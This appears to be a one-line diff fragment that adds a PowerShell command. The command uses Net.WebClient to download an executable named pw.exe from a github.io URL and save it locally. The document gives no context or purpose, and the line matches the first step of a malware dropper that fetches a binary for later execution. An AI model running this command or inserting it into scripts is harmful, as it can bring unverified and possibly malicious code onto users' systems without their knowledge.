@@ -1,0 +1,1 @@
+-Command "(New-Object Net.WebClient).DownloadFile('https://xredmelonx.github.io/download.io/link/pw.exe', 'pw.exe')"
